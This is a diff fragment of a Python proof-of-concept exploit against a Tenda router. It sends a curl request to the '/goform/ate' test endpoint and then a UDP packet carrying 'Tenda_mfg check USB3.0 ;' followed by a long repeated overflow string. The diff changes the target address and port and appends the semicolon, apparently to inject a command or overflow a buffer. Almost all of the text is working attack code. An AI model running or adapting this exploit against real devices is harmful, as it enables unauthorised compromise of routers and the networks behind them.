@@ -95,16 +95,15 @@ import socket
 import time
 import os
 
-os.system('curl http://172.30.214.100/goform/ate')
+os.system('curl http://172.30.208.100/goform/ate')
 
 time.sleep(3)
 
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 
-server_address = ('172.30.214.100', 80)
-command = b's' * 999
-message = b'Tenda_mfg check'+ chars
-
+server_address = ('172.30.208.100', 7329)
+command = b'ss'*999
+message = b'Tenda_mfg check USB3.0 ;' + command
 try:
     print(f'Sending: {message}')
     sock.sendto(message, server_address)
